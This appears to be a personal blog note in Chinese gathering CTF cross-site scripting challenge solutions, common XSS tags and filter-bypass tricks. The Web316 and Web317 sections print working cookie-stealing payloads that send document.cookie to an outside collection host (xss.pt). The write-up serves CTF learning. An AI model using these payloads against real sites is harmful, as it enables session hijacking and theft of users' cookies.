---
author: "Yiming Shen"
date: 2022-02-26
lastmod: 2022-02-26
title: "XSS类型题目积累及资料"
tags: [
    "CTF",
    "XSS",
    "Web",
    "Note",
]
categories: [
    "Notes",
     "CTF",
]
showtoc: true
math: true
typora-root-url: ..\..\..\..\static\
---

> 跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。

## 反射型XSS

> 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。

### 无过滤反射型 

#### Web316 - [XSS平台](https://xss.pt)

![image-20220226192829187](/xss.assets/%7D/image-20220226192829187.png)

抓包后cookie提示flag在此，但需要管理员身份。

即生成链接诱骗管理员（本题为BOT）点击获取其cookie。

**借助XSS平台**
平台上放置脚本（可自行搭建）

```php
(function(){(new Image()).src='https://xss.pt/xss.php?do=api&id=Sh8s&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=Sh8s&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
```

[Xss平台](https://xss.pt) 注册登录后创建项目，将其提供的xss代码（引导访问其链接从而存储信息）填入框中，即可获得管理员访问cookie。

![image-20220226201645270](/xss.assets/%7D/image-20220226201645270.png)

### 过滤反射型

#### Web317 - \<onload\>

```html
<BODY ONLOAD=document.location='https://xss.pt/Sh8sp.jpg?cookie='+document.cookie;></body>
```

> **window.onload()** 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。

#### 空格过滤

换成`/**/`


## 常见执行`XSS`的标签

```html
<script src="*.js"></script>

<script>alert(1)</script>

<img src="s" onerror=alert('xss')></img>

<link rel="import" href="*.html">

<iframe src="javascript:alert(1)"></iframe> <!-JavaScript伪协议->

<a href="javascript:alert(1)">click</a>

<svg/onload=alert(1)>

<h1 onmousemove="alert('moved!')">Title1</h1>
    
<iframe src = "data:text/html;base64,_base64codehere="></iframe> <!-Data伪协议->
```

## XSS过滤和绕过

> XSS主要在**代码层**和**WAF层**实现过滤

### 编码过滤

1. 对payload进行HTML实体编码过滤

   `alert(1)`编码成`&#x61 &#x6c...`

   payload在标签属性中触发事件前，浏览器已经对payload进行了一次解码，即从实体编码转换成了常规数据。

2. 通过闭合JS语句逃逸payload

   `var url = 'http://xss.com/?name=<?=$name?>'+'<?=$address?>';`

   可转义第一个引号使其和第二个参数的引号闭合 在第二个参数内插入payload

3. 

## 参考

[1] [XSS平台的使用](http://zhuabapa.top/2019/12/25/XSS%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/)

[2] [从0到1:CTFer](#xss)